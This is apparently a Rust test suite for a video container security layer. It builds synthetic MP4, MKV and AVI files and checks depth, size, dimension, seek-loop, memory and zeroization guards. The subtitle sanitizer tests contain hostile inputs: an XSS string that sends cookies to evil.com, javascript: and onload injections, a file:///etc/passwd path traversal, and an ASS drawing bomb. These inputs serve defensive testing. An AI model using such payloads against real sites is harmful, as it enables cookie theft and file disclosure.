// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! Official Video Media Compliance and 6-Layer Security Defense Test Suite.
//!
//! Validates ISO Base Media (ISO/IEC 14496-12), Matroska (EBML), and AVI RIFF container compliance
//! and executes comprehensive adversarial test vectors against all 6 security layers:
//! 1. Container and Header Equivalence Oracles (MP4, MKV, AVI)
//! 2. Layer 1: Atom/Box Depth Guard & 64-bit Largesize Overflow Protection
//! 3. Layer 2: Video Dimension Hard Bounds & 256MB Frame Memory Fuse
//! 4. Layer 3: Demuxer Infinite Seek Loop & PTS Timestamp Monotonicity Fuse
//! 5. Layer 4: Subtitle Active Script Neutralizer, Protocol Sanitizer & ASS Drawing Sandbox
//! 6. Layer 5: Video Task Resident Memory Watchdog (64MB Quota)
//! 7. Layer 6: Zeroize-on-Drop Sensitive Video Frame Memory Purge
//! 8. End-to-End Unified Defense Pipeline Integration

use ttzip_engine::security::media_defense::{
    AtomDepthGuard, DemuxerLoopGuard, SanitizedSubtitle, SensitiveVideoBuffer,
    SubtitleScriptSandboxGuard, VideoContainerFormat, VideoDefenseError, VideoDimensionGuard,
    VideoMemoryBudgetGuard, VideoPixelFormat, VideoSecurityPipeline, VideoSubtitleFormat,
    DEFAULT_MAX_ASS_DRAWING_NODES, DEFAULT_MAX_ATOM_DEPTH,
    DEFAULT_MAX_CONSECUTIVE_CORRUPTED_PACKETS, DEFAULT_MAX_PTS_BACKWARDS_DRIFT_SEC,
    DEFAULT_MAX_SEEK_ITERATIONS, DEFAULT_MAX_VIDEO_DIMENSION, DEFAULT_MAX_VIDEO_FRAME_MEMORY,
    DEFAULT_MAX_VIDEO_RESIDENT_MEMORY_BUDGET, DEFAULT_MIN_VIDEO_DIMENSION,
};

// ============================================================================
// Synthetic Test Vector Generators
// ============================================================================

/// Generates a valid canonical ISO Base Media (MP4/ISOBMFF) container in memory.
fn generate_canonical_mp4(width: u32, height: u32, duration_ms: u32) -> Vec<u8> {
    let mut buf = Vec::new();

    // 1. 'ftyp' box
    let mut ftyp_payload = Vec::new();
    ftyp_payload.extend_from_slice(b"isom"); // Major brand
    ftyp_payload.extend_from_slice(&512u32.to_be_bytes()); // Minor version
    ftyp_payload.extend_from_slice(b"isomiso2mp41"); // Compatible brands
    let ftyp_len = (8 + ftyp_payload.len()) as u32;
    buf.extend_from_slice(&ftyp_len.to_be_bytes());
    buf.extend_from_slice(b"ftyp");
    buf.extend_from_slice(&ftyp_payload);

    // 2. 'moov' container box
    let mut moov_payload = Vec::new();

    // 2a. 'mvhd' box (Movie Header Box, Version 0)
    let mut mvhd = Vec::new();
    mvhd.extend_from_slice(&0u32.to_be_bytes()); // Version 0 + flags
    mvhd.extend_from_slice(&0u32.to_be_bytes()); // Creation time
    mvhd.extend_from_slice(&0u32.to_be_bytes()); // Modification time
    mvhd.extend_from_slice(&1000u32.to_be_bytes()); // Timescale (1000 Hz)
    mvhd.extend_from_slice(&duration_ms.to_be_bytes()); // Duration
    mvhd.extend_from_slice(&0x00010000u32.to_be_bytes()); // Rate 1.0
    mvhd.extend_from_slice(&0x0100u16.to_be_bytes()); // Volume 1.0
    mvhd.extend_from_slice(&[0u8; 10]); // Reserved
    // Unity matrix (3x3)
    let matrix: [u32; 9] = [
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    ];
    for m in matrix {
        mvhd.extend_from_slice(&m.to_be_bytes());
    }
    mvhd.extend_from_slice(&[0u8; 24]); // Pre-defined
    mvhd.extend_from_slice(&2u32.to_be_bytes()); // Next track ID

    let mvhd_len = (8 + mvhd.len()) as u32;
    moov_payload.extend_from_slice(&mvhd_len.to_be_bytes());
    moov_payload.extend_from_slice(b"mvhd");
    moov_payload.extend_from_slice(&mvhd);

    // 2b. 'trak' box (Video Track)
    let mut trak_payload = Vec::new();

    // 'tkhd' box (Track Header Box)
    let mut tkhd = Vec::new();
    tkhd.extend_from_slice(&1u32.to_be_bytes()); // Track enabled flag = 1
    tkhd.extend_from_slice(&0u32.to_be_bytes()); // Creation time
    tkhd.extend_from_slice(&0u32.to_be_bytes()); // Modification time
    tkhd.extend_from_slice(&1u32.to_be_bytes()); // Track ID = 1
    tkhd.extend_from_slice(&0u32.to_be_bytes()); // Reserved
    tkhd.extend_from_slice(&duration_ms.to_be_bytes()); // Duration
    tkhd.extend_from_slice(&[0u8; 8]); // Reserved
    tkhd.extend_from_slice(&0u16.to_be_bytes()); // Layer
    tkhd.extend_from_slice(&0u16.to_be_bytes()); // Alternate group
    tkhd.extend_from_slice(&0u16.to_be_bytes()); // Volume
    tkhd.extend_from_slice(&0u16.to_be_bytes()); // Reserved
    for m in matrix {
        tkhd.extend_from_slice(&m.to_be_bytes());
    }
    tkhd.extend_from_slice(&(width << 16).to_be_bytes()); // Fixed-point 16.16 width
    tkhd.extend_from_slice(&(height << 16).to_be_bytes()); // Fixed-point 16.16 height

    let tkhd_len = (8 + tkhd.len()) as u32;
    trak_payload.extend_from_slice(&tkhd_len.to_be_bytes());
    trak_payload.extend_from_slice(b"tkhd");
    trak_payload.extend_from_slice(&tkhd);

    // 'mdia' box
    let mut mdia_payload = Vec::new();

    // 'mdhd' box
    let mut mdhd = Vec::new();
    mdhd.extend_from_slice(&0u32.to_be_bytes()); // Version 0
    mdhd.extend_from_slice(&0u32.to_be_bytes()); // Creation time
    mdhd.extend_from_slice(&0u32.to_be_bytes()); // Modification time
    mdhd.extend_from_slice(&1000u32.to_be_bytes()); // Timescale
    mdhd.extend_from_slice(&duration_ms.to_be_bytes()); // Duration
    mdhd.extend_from_slice(&0x55C4u16.to_be_bytes()); // Language 'und'
    mdhd.extend_from_slice(&0u16.to_be_bytes()); // Pre-defined

    let mdhd_len = (8 + mdhd.len()) as u32;
    mdia_payload.extend_from_slice(&mdhd_len.to_be_bytes());
    mdia_payload.extend_from_slice(b"mdhd");
    mdia_payload.extend_from_slice(&mdhd);

    // 'hdlr' box
    let mut hdlr = Vec::new();
    hdlr.extend_from_slice(&0u32.to_be_bytes()); // Version 0
    hdlr.extend_from_slice(&0u32.to_be_bytes()); // Pre-defined
    hdlr.extend_from_slice(b"vide"); // Handler type
    hdlr.extend_from_slice(&[0u8; 12]); // Reserved
    hdlr.extend_from_slice(b"VideoHandler\0");

    let hdlr_len = (8 + hdlr.len()) as u32;
    mdia_payload.extend_from_slice(&hdlr_len.to_be_bytes());
    mdia_payload.extend_from_slice(b"hdlr");
    mdia_payload.extend_from_slice(&hdlr);

    let mdia_len = (8 + mdia_payload.len()) as u32;
    trak_payload.extend_from_slice(&mdia_len.to_be_bytes());
    trak_payload.extend_from_slice(b"mdia");
    trak_payload.extend_from_slice(&mdia_payload);

    let trak_len = (8 + trak_payload.len()) as u32;
    moov_payload.extend_from_slice(&trak_len.to_be_bytes());
    moov_payload.extend_from_slice(b"trak");
    moov_payload.extend_from_slice(&trak_payload);

    let moov_len = (8 + moov_payload.len()) as u32;
    buf.extend_from_slice(&moov_len.to_be_bytes());
    buf.extend_from_slice(b"moov");
    buf.extend_from_slice(&moov_payload);

    // 3. 'mdat' box with dummy video payload
    let mdat_payload = [0xAA; 128];
    let mdat_len = (8 + mdat_payload.len()) as u32;
    buf.extend_from_slice(&mdat_len.to_be_bytes());
    buf.extend_from_slice(b"mdat");
    buf.extend_from_slice(&mdat_payload);

    buf
}

/// Generates a valid canonical Matroska (MKV) EBML container in memory.
fn generate_canonical_mkv(width: u32, height: u32) -> Vec<u8> {
    let mut buf = Vec::new();

    // 1. EBML Header [0x1A, 0x45, 0xDF, 0xA3]
    buf.extend_from_slice(&[0x1A, 0x45, 0xDF, 0xA3]);
    let mut ebml_payload = Vec::new();
    // EBMLVersion [0x42, 0x86] = 1
    ebml_payload.extend_from_slice(&[0x42, 0x86, 0x81, 0x01]);
    // EBMLReadVersion [0x42, 0xF7] = 1
    ebml_payload.extend_from_slice(&[0x42, 0xF7, 0x81, 0x01]);
    // DocType [0x42, 0x82] = "matroska"
    ebml_payload.extend_from_slice(&[0x42, 0x82, 0x88]);
    ebml_payload.extend_from_slice(b"matroska");
    // DocTypeVersion [0x42, 0x87] = 4
    ebml_payload.extend_from_slice(&[0x42, 0x87, 0x81, 0x04]);

    // Encode length of EBML header (VINT)
    buf.push(0x80 | (ebml_payload.len() as u8));
    buf.extend_from_slice(&ebml_payload);

    // 2. Segment [0x18, 0x53, 0x80, 0x67]
    buf.extend_from_slice(&[0x18, 0x53, 0x80, 0x67]);
    let mut segment_payload = Vec::new();

    // 2a. Tracks [0x16, 0x54, 0xAE, 0x6B]
    segment_payload.extend_from_slice(&[0x16, 0x54, 0xAE, 0x6B]);
    let mut tracks_payload = Vec::new();

    // TrackEntry [0xAE]
    let mut track_entry = Vec::new();
    // TrackNumber [0xD7] = 1
    track_entry.extend_from_slice(&[0xD7, 0x81, 0x01]);
    // TrackType [0x83] = 1 (Video)
    track_entry.extend_from_slice(&[0x83, 0x81, 0x01]);
    // CodecID [0x86] = "V_MPEG4/ISO/AVC"
    track_entry.extend_from_slice(&[0x86, 0x8F]);
    track_entry.extend_from_slice(b"V_MPEG4/ISO/AVC");
    // VideoSettings [0xE0]
    let mut video_settings = Vec::new();
    // PixelWidth [0xB0] = width
    video_settings.extend_from_slice(&[0xB0, 0x82]);
    video_settings.extend_from_slice(&(width as u16).to_be_bytes());
    // PixelHeight [0xBA] = height
    video_settings.extend_from_slice(&[0xBA, 0x82]);
    video_settings.extend_from_slice(&(height as u16).to_be_bytes());

    track_entry.push(0xE0);
    track_entry.push(0x80 | (video_settings.len() as u8));
    track_entry.extend_from_slice(&video_settings);

    tracks_payload.push(0xAE);
    tracks_payload.push(0x80 | (track_entry.len() as u8));
    tracks_payload.extend_from_slice(&track_entry);

    segment_payload.push(0x80 | (tracks_payload.len() as u8));
    segment_payload.extend_from_slice(&tracks_payload);

    // 2b. Cluster [0x1F, 0x43, 0xB6, 0x75]
    segment_payload.extend_from_slice(&[0x1F, 0x43, 0xB6, 0x75]);
    let mut cluster_payload = Vec::new();
    // Timestamp [0xE7] = 0
    cluster_payload.extend_from_slice(&[0xE7, 0x81, 0x00]);
    // SimpleBlock [0xA3]
    let mut simple_block = Vec::new();
    simple_block.extend_from_slice(&[0x81, 0x00, 0x00, 0x80]); // Track 1, time 0, keyframe
    simple_block.extend_from_slice(&[0xFF; 64]); // Payload
    cluster_payload.push(0xA3);
    cluster_payload.push(0x80 | (simple_block.len() as u8));
    cluster_payload.extend_from_slice(&simple_block);

    segment_payload.push(0x80 | (cluster_payload.len() as u8));
    segment_payload.extend_from_slice(&cluster_payload);

    buf.push(0x80 | (segment_payload.len() as u8));
    buf.extend_from_slice(&segment_payload);

    buf
}

/// Generates a valid canonical RIFF AVI container in memory.
fn generate_canonical_avi(width: u32, height: u32, total_frames: u32) -> Vec<u8> {
    let mut buf = Vec::new();

    // 1. RIFF Header
    buf.extend_from_slice(b"RIFF");
    let riff_size_pos = buf.len();
    buf.extend_from_slice(&0u32.to_le_bytes()); // Placeholder for total size
    buf.extend_from_slice(b"AVI ");

    // 2. LIST 'hdrl'
    buf.extend_from_slice(b"LIST");
    let hdrl_size_pos = buf.len();
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(b"hdrl");

    // 2a. 'avih' chunk (MainAVIHeader)
    buf.extend_from_slice(b"avih");
    buf.extend_from_slice(&56u32.to_le_bytes()); // avih chunk size
    buf.extend_from_slice(&33333u32.to_le_bytes()); // Microseconds per frame (30 fps)
    buf.extend_from_slice(&1000000u32.to_le_bytes()); // Max bytes per sec
    buf.extend_from_slice(&0u32.to_le_bytes()); // Padding granularity
    buf.extend_from_slice(&0x10u32.to_le_bytes()); // Flags (has index)
    buf.extend_from_slice(&total_frames.to_le_bytes()); // Total frames
    buf.extend_from_slice(&0u32.to_le_bytes()); // Initial frames
    buf.extend_from_slice(&1u32.to_le_bytes()); // Streams = 1
    buf.extend_from_slice(&0u32.to_le_bytes()); // Suggested buffer size
    buf.extend_from_slice(&width.to_le_bytes()); // Width
    buf.extend_from_slice(&height.to_le_bytes()); // Height
    buf.extend_from_slice(&[0u8; 16]); // Reserved

    // 2b. LIST 'strl' (Stream list)
    buf.extend_from_slice(b"LIST");
    let strl_size_pos = buf.len();
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(b"strl");

    // 'strh' (Stream Header)
    buf.extend_from_slice(b"strh");
    buf.extend_from_slice(&56u32.to_le_bytes());
    buf.extend_from_slice(b"vids"); // Stream type: video
    buf.extend_from_slice(b"H264"); // Codec: H264
    buf.extend_from_slice(&0u32.to_le_bytes()); // Flags
    buf.extend_from_slice(&0u16.to_le_bytes()); // Priority
    buf.extend_from_slice(&0u16.to_le_bytes()); // Language
    buf.extend_from_slice(&0u32.to_le_bytes()); // Initial frames
    buf.extend_from_slice(&1u32.to_le_bytes()); // Scale
    buf.extend_from_slice(&30u32.to_le_bytes()); // Rate (30 fps)
    buf.extend_from_slice(&0u32.to_le_bytes()); // Start
    buf.extend_from_slice(&total_frames.to_le_bytes()); // Length
    buf.extend_from_slice(&0u32.to_le_bytes()); // Suggested buffer size
    buf.extend_from_slice(&0u32.to_le_bytes()); // Quality
    buf.extend_from_slice(&0u32.to_le_bytes()); // Sample size
    buf.extend_from_slice(&0u16.to_le_bytes()); // Frame rect left
    buf.extend_from_slice(&0u16.to_le_bytes()); // Frame rect top
    buf.extend_from_slice(&(width as u16).to_le_bytes()); // Frame rect right
    buf.extend_from_slice(&(height as u16).to_le_bytes()); // Frame rect bottom

    // 'strf' (Stream Format: BITMAPINFOHEADER)
    buf.extend_from_slice(b"strf");
    buf.extend_from_slice(&40u32.to_le_bytes());
    buf.extend_from_slice(&40u32.to_le_bytes()); // biSize
    buf.extend_from_slice(&(width as i32).to_le_bytes());
    buf.extend_from_slice(&(height as i32).to_le_bytes());
    buf.extend_from_slice(&1u16.to_le_bytes()); // biPlanes
    buf.extend_from_slice(&24u16.to_le_bytes()); // biBitCount
    buf.extend_from_slice(b"H264"); // biCompression
    buf.extend_from_slice(&0u32.to_le_bytes()); // biSizeImage
    buf.extend_from_slice(&0u32.to_le_bytes()); // biXPelsPerMeter
    buf.extend_from_slice(&0u32.to_le_bytes()); // biYPelsPerMeter
    buf.extend_from_slice(&0u32.to_le_bytes()); // biClrUsed
    buf.extend_from_slice(&0u32.to_le_bytes()); // biClrImportant

    // Patch strl size
    let strl_len = (buf.len() - strl_size_pos - 4) as u32;
    buf[strl_size_pos..strl_size_pos + 4].copy_from_slice(&strl_len.to_le_bytes());

    // Patch hdrl size
    let hdrl_len = (buf.len() - hdrl_size_pos - 4) as u32;
    buf[hdrl_size_pos..hdrl_size_pos + 4].copy_from_slice(&hdrl_len.to_le_bytes());

    // 3. LIST 'movi'
    buf.extend_from_slice(b"LIST");
    let movi_size_pos = buf.len();
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(b"movi");

    // Single dummy video chunk '00dc'
    buf.extend_from_slice(b"00dc");
    buf.extend_from_slice(&32u32.to_le_bytes());
    buf.extend_from_slice(&[0xBB; 32]);

    // Patch movi size
    let movi_len = (buf.len() - movi_size_pos - 4) as u32;
    buf[movi_size_pos..movi_size_pos + 4].copy_from_slice(&movi_len.to_le_bytes());

    // Patch total RIFF size
    let riff_len = (buf.len() - 8) as u32;
    buf[riff_size_pos..riff_size_pos + 4].copy_from_slice(&riff_len.to_le_bytes());

    buf
}

// ============================================================================
// ISO Base Media (ISO/IEC 14496-12) & Matroska / AVI Compliance Tests
// ============================================================================

#[test]
fn test_isobmff_compliance_canonical_mp4_parsing() {
    let mp4_data = generate_canonical_mp4(1920, 1080, 5000);
    assert_eq!(
        VideoSecurityPipeline::detect_container_format(&mp4_data),
        VideoContainerFormat::Mp4
    );

    let mut guard = AtomDepthGuard::new();
    let summary = guard.scan_container_atoms(&mp4_data).unwrap();

    assert!(summary.total_boxes >= 3);
    assert!(summary.max_depth_reached >= 3); // moov -> trak -> mdia
    assert!(summary.top_level_boxes.contains(b"ftyp"));
    assert!(summary.top_level_boxes.contains(b"moov"));
    assert!(summary.top_level_boxes.contains(b"mdat"));
}

#[test]
fn test_matroska_compliance_canonical_mkv_parsing() {
    let mkv_data = generate_canonical_mkv(1280, 720);
    assert_eq!(
        VideoSecurityPipeline::detect_container_format(&mkv_data),
        VideoContainerFormat::Mkv
    );

    let mut pipeline = VideoSecurityPipeline::default();
    let (report, _res) = pipeline.inspect_container_header(&mkv_data).unwrap();
    assert_eq!(report.format, VideoContainerFormat::Mkv);
    assert_eq!(report.payload_size, mkv_data.len());
}

#[test]
fn test_riff_avi_compliance_canonical_avi_parsing() {
    let avi_data = generate_canonical_avi(640, 480, 150);
    assert_eq!(
        VideoSecurityPipeline::detect_container_format(&avi_data),
        VideoContainerFormat::Avi
    );

    let mut pipeline = VideoSecurityPipeline::default();
    let (report, _res) = pipeline.inspect_container_header(&avi_data).unwrap();
    assert_eq!(report.format, VideoContainerFormat::Avi);
    assert_eq!(report.payload_size, avi_data.len());
}

// ============================================================================
// Layer 1: Atom/Box Depth Guard & 64-bit Largesize Adversarial Matrix
// ============================================================================

#[test]
fn test_adversarial_atom_depth_bomb() {
    let mut guard = AtomDepthGuard::with_max_depth(DEFAULT_MAX_ATOM_DEPTH); // 16

    // Push 16 nested container boxes (allowed)
    for depth in 1..=16 {
        assert!(guard
            .push_box(*b"moov", 10000 - (depth as u64 * 100), (depth as u64) * 8, Some(10000))
            .is_ok());
    }
    assert_eq!(guard.current_depth(), 16);

    // 17th level exceeds limit of 16 -> trips depth fuse
    let err = guard.push_box(*b"trak", 100, 150, Some(10000)).unwrap_err();
    assert_eq!(
        err,
        VideoDefenseError::AtomDepthLimitExceeded {
            depth: 17,
            max_depth: 16
        }
    );
}

#[test]
fn test_adversarial_64bit_largesize_overflow() {
    let mut buf = Vec::new();
    buf.extend_from_slice(&1u32.to_be_bytes()); // largesize trigger
    buf.extend_from_slice(b"mdat");
    buf.extend_from_slice(&u64::MAX.to_be_bytes()); // malicious 0xFFFFFFFFFFFFFFFF size

    let err = AtomDepthGuard::parse_box_header(&buf, 100, Some(500)).unwrap_err();
    match err {
        VideoDefenseError::AtomLargesizeOverflow { declared_size, .. } => {
            assert_eq!(declared_size, u64::MAX);
        }
        _ => panic!("Expected AtomLargesizeOverflow"),
    }
}

#[test]
fn test_adversarial_truncated_box_size() {
    let mut buf = Vec::new();
    buf.extend_from_slice(&4u32.to_be_bytes()); // invalid size 4 (< 8 header)
    buf.extend_from_slice(b"free");

    let err = AtomDepthGuard::parse_box_header(&buf, 0, Some(100)).unwrap_err();
    match err {
        VideoDefenseError::AtomInvalidSize { size, min_required, .. } => {
            assert_eq!(size, 4);
            assert_eq!(min_required, 8);
        }
        _ => panic!("Expected AtomInvalidSize"),
    }
}

#[test]
fn test_adversarial_atom_out_of_bounds_offset() {
    let mut buf = Vec::new();
    buf.extend_from_slice(&2048u32.to_be_bytes());
    buf.extend_from_slice(b"moov");

    // File only has 512 bytes, declared box is 2048 bytes
    let err = AtomDepthGuard::parse_box_header(&buf, 0, Some(512)).unwrap_err();
    match err {
        VideoDefenseError::AtomOutOfBoundsOffset { size, stream_len, .. } => {
            assert_eq!(size, 2048);
            assert_eq!(stream_len, 512);
        }
        _ => panic!("Expected AtomOutOfBoundsOffset"),
    }
}

// ============================================================================
// Layer 2: Video Dimension Hard Bounds & 256MB Frame Memory Fuse
// ============================================================================

#[test]
fn test_dimension_bounds_and_zero_prevention() {
    let guard = VideoDimensionGuard::new();

    // Width zero
    assert_eq!(
        guard.validate_dimensions(0, 1080).unwrap_err(),
        VideoDefenseError::InvalidDimensionZero { axis: "width" }
    );
    // Height zero
    assert_eq!(
        guard.validate_dimensions(1920, 0).unwrap_err(),
        VideoDefenseError::InvalidDimensionZero { axis: "height" }
    );

    // Minimum valid dimension (1x1)
    assert!(guard.validate_dimensions(DEFAULT_MIN_VIDEO_DIMENSION, DEFAULT_MIN_VIDEO_DIMENSION).is_ok());

    // Maximum 8K UHD dimension (8192x8192)
    assert!(guard.validate_dimensions(DEFAULT_MAX_VIDEO_DIMENSION, DEFAULT_MAX_VIDEO_DIMENSION).is_ok());

    // Out of bounds (> 8192 px)
    assert_eq!(
        guard.validate_dimensions(8193, 1080).unwrap_err(),
        VideoDefenseError::DimensionLimitExceeded {
            axis: "width",
            value: 8193,
            min: 1,
            max: 8192
        }
    );
}

#[test]
fn test_frame_memory_256mb_boundary_and_explosion() {
    let guard = VideoDimensionGuard::new();

    // 8192x8192 RGBA32: 8192 * 8192 * 4 = 268,435,456 bytes (exact 256 MiB boundary)
    let exact_256mb = guard
        .estimate_frame_size(8192, 8192, VideoPixelFormat::Rgba32)
        .unwrap();
    assert_eq!(exact_256mb, DEFAULT_MAX_VIDEO_FRAME_MEMORY);

    // Custom tighter guard (16MB budget)
    let tight_guard = VideoDimensionGuard::with_bounds(1, 8192, 16 * 1024 * 1024);
    // 3840x2160 RGBA32 requires ~33.18 MB > 16 MB
    let err = tight_guard
        .estimate_frame_size(3840, 2160, VideoPixelFormat::Rgba32)
        .unwrap_err();
    match err {
        VideoDefenseError::FrameMemoryExceeded { width, height, estimated_bytes, max_bytes } => {
            assert_eq!(width, 3840);
            assert_eq!(height, 2160);
            assert_eq!(estimated_bytes, 3840 * 2160 * 4);
            assert_eq!(max_bytes, 16 * 1024 * 1024);
        }
        _ => panic!("Expected FrameMemoryExceeded"),
    }
}

// ============================================================================
// Layer 3: Demuxer Infinite Seek Loop & PTS Timestamp Monotonicity Fuse
// ============================================================================

#[test]
fn test_demuxer_infinite_seek_loop_breaker() {
    let guard = DemuxerLoopGuard::new();
    let mut tracker = guard.create_tracker();

    for _ in 0..DEFAULT_MAX_SEEK_ITERATIONS {
        assert!(tracker.record_seek_step().is_ok());
    }

    // 1001st seek step trips iteration fuse
    let err = tracker.record_seek_step().unwrap_err();
    assert_eq!(
        err,
        VideoDefenseError::SeekIterationLimitExceeded {
            iterations: 1001,
            limit: DEFAULT_MAX_SEEK_ITERATIONS
        }
    );
}

#[test]
fn test_demuxer_consecutive_and_cumulative_error_fuses() {
    let guard = DemuxerLoopGuard::new();
    let mut tracker = guard.create_tracker();

    for _ in 0..DEFAULT_MAX_CONSECUTIVE_CORRUPTED_PACKETS {
        assert!(tracker.record_packet_error().is_ok());
    }

    // 33rd consecutive error trips fuse
    let err = tracker.record_packet_error().unwrap_err();
    assert_eq!(
        err,
        VideoDefenseError::DemuxerConsecutiveErrorFuse {
            consecutive_errors: 33,
            limit: DEFAULT_MAX_CONSECUTIVE_CORRUPTED_PACKETS
        }
    );
}

#[test]
fn test_demuxer_pts_monotonicity_regression() {
    let guard = DemuxerLoopGuard::new();
    let mut tracker = guard.create_tracker();

    assert!(tracker.record_packet_success(100.0, None).is_ok());
    assert!(tracker.record_packet_success(102.0, None).is_ok());

    // Valid B-frame jitter: from 102.0s back to 100.5s (drop 1.5s <= 5.0s tolerance)
    assert!(tracker.record_packet_success(100.5, None).is_ok());

    // Malicious backwards jump: from 100.5s back to 10.0s (drop 90.5s > 5.0s)
    let err = tracker.record_packet_success(10.0, None).unwrap_err();
    match err {
        VideoDefenseError::PtsMonotonicityRegression {
            last_pts,
            current_pts,
            regression_sec,
            max_allowed_sec,
        } => {
            assert_eq!(last_pts, 100.5);
            assert_eq!(current_pts, 10.0);
            assert!((regression_sec - 90.5).abs() < 0.001);
            assert_eq!(max_allowed_sec, DEFAULT_MAX_PTS_BACKWARDS_DRIFT_SEC);
        }
        _ => panic!("Expected PtsMonotonicityRegression"),
    }
}

// ============================================================================
// Layer 4: Subtitle Active Script Neutralizer & ASS Drawing Sandbox
// ============================================================================

#[test]
fn test_subtitle_xss_and_active_script_sanitization() {
    let guard = SubtitleScriptSandboxGuard::new();
    let malicious = "Subtitle: <script>document.location='http://evil.com?c='+document.cookie</script>Clean Text <iframe src='javascript:attack()'></iframe><span style='color:red' onload='pwn()'>OK</span>";

    let sanitized: SanitizedSubtitle = guard.sanitize(malicious, VideoSubtitleFormat::Srt).unwrap();
    assert!(!sanitized.sanitized_text.contains("<script>"));
    assert!(!sanitized.sanitized_text.contains("document.cookie"));
    assert!(!sanitized.sanitized_text.contains("<iframe>"));
    assert!(!sanitized.sanitized_text.contains("javascript:"));
    assert!(!sanitized.sanitized_text.contains("onload"));
    assert!(sanitized.sanitized_text.contains("Clean Text"));
    assert!(sanitized.report.stripped_tags >= 3);
}

#[test]
fn test_subtitle_protocol_and_path_traversal_neutralization() {
    let guard = SubtitleScriptSandboxGuard::new();
    let raw = "Font: http://fontsite.org/font.ttf, File: file:///etc/passwd, Path: ../../../../secret/key";
    let sanitized = guard.sanitize(raw, VideoSubtitleFormat::Vtt).unwrap();

    assert!(!sanitized.sanitized_text.contains("http://"));
    assert!(!sanitized.sanitized_text.contains("file://"));
    assert!(!sanitized.sanitized_text.contains("../"));
    assert!(sanitized.sanitized_text.contains("[blocked-scheme]"));
    assert!(sanitized.sanitized_text.contains("[neutralized-path]"));
}

#[test]
fn test_subtitle_ass_vector_drawing_bomb() {
    let guard = SubtitleScriptSandboxGuard::with_max_ass_drawing_nodes(DEFAULT_MAX_ASS_DRAWING_NODES);

    // Generate normal ASS drawing line (100 vertices <= 1024)
    let mut normal_ass = String::from(r"Dialogue: 0,0:00:00.00,0:00:05.00,Default,,0,0,0,,{\p1}m 0 0");
    for i in 1..=50 {
        normal_ass.push_str(&format!(" l {} {}", i * 2, i * 2));
    }
    normal_ass.push_str(r"{\p0}");
    assert!(guard.sanitize(&normal_ass, VideoSubtitleFormat::Ass).is_ok());

    // Generate malicious ASS drawing bomb with > 1024 nodes
    let mut bomb_ass = String::from(r"Dialogue: 0,0:00:00.00,0:00:05.00,Default,,0,0,0,,{\p1}m 0 0");
    for i in 1..=600 {
        bomb_ass.push_str(&format!(" l {} {}", i, i));
    }
    bomb_ass.push_str(r"{\p0}");

    let err = guard.sanitize(&bomb_ass, VideoSubtitleFormat::Ass).unwrap_err();
    match err {
        VideoDefenseError::AssDrawingLimitExceeded { node_count, limit } => {
            assert!(node_count > DEFAULT_MAX_ASS_DRAWING_NODES);
            assert_eq!(limit, DEFAULT_MAX_ASS_DRAWING_NODES);
        }
        _ => panic!("Expected AssDrawingLimitExceeded"),
    }
}

// ============================================================================
// Layer 5: Video Task Resident Memory Watchdog (64MB Quota)
// ============================================================================

#[test]
fn test_video_memory_budget_quota_exhaustion_and_raii() {
    let guard = VideoMemoryBudgetGuard::new(DEFAULT_MAX_VIDEO_RESIDENT_MEMORY_BUDGET); // 64 MiB

    // Reserve 40 MiB: OK
    let res1 = guard.reserve(40 * 1024 * 1024).unwrap();
    assert_eq!(guard.allocated(), 40 * 1024 * 1024);
    assert_eq!(guard.available(), 24 * 1024 * 1024);

    // Attempt to reserve another 30 MiB (40 + 30 = 70 MiB > 64 MiB limit) -> Error
    let err = guard.reserve(30 * 1024 * 1024).unwrap_err();
    match err {
        VideoDefenseError::MemoryBudgetExceeded { allocated_bytes, budget_bytes } => {
            assert_eq!(allocated_bytes, 70 * 1024 * 1024);
            assert_eq!(budget_bytes, 64 * 1024 * 1024);
        }
        _ => panic!("Expected MemoryBudgetExceeded"),
    }

    // Drop res1 -> automatically releases 40 MiB back to budget
    drop(res1);
    assert_eq!(guard.allocated(), 0);
    assert_eq!(guard.available(), 64 * 1024 * 1024);
}

// ============================================================================
// Layer 6: Zeroize-on-Drop Sensitive Video Buffer
// ============================================================================

#[test]
fn test_sensitive_video_buffer_zeroize_and_constant_time() {
    let mut buf = SensitiveVideoBuffer::from_vec(vec![0xAA; 1024]);
    assert_eq!(buf.len(), 1024);

    let other_same = SensitiveVideoBuffer::from_vec(vec![0xAA; 1024]);
    let other_diff = SensitiveVideoBuffer::from_vec(vec![0xBB; 1024]);

    assert!(buf.ct_eq(&other_same));
    assert!(!buf.ct_eq(&other_diff));

    buf.wipe();
    assert_eq!(buf.len(), 0);
    assert!(buf.is_empty());
}

// ============================================================================
// End-to-End Unified Defense Pipeline Integration
// ============================================================================

#[test]
fn test_pipeline_e2e_isobmff_inspection() {
    let mp4_data = generate_canonical_mp4(3840, 2160, 10000);
    let mut pipeline = VideoSecurityPipeline::default();

    let (report, reservation) = pipeline.inspect_container_header(&mp4_data).unwrap();
    assert_eq!(report.format, VideoContainerFormat::Mp4);
    assert_eq!(report.payload_size, mp4_data.len());
    assert_eq!(reservation.bytes(), mp4_data.len());

    let dim_report = pipeline
        .validate_video_dimensions(3840, 2160, VideoPixelFormat::Yuv420p)
        .unwrap();
    assert_eq!(dim_report.width, 3840);
    assert_eq!(dim_report.height, 2160);
    assert!((dim_report.aspect_ratio - (16.0 / 9.0)).abs() < 0.001);
}

#[test]
fn test_pipeline_e2e_sensitive_frame_allocation_and_memory_gate() {
    let pipeline = VideoSecurityPipeline::default();

    // 1080p YUV420p frame: 1920 * 1080 * 1.5 = 3,110,400 bytes (~2.96 MB <= 64 MB budget)
    let (frame_buffer, reservation) = pipeline
        .allocate_sensitive_frame(1920, 1080, VideoPixelFormat::Yuv420p)
        .unwrap();

    assert_eq!(frame_buffer.len(), 1920 * 1080 * 3 / 2);
    assert_eq!(reservation.bytes(), 1920 * 1080 * 3 / 2);
    assert_eq!(pipeline.memory_watchdog.allocated(), 1920 * 1080 * 3 / 2);

    drop(reservation);
    assert_eq!(pipeline.memory_watchdog.allocated(), 0);
}
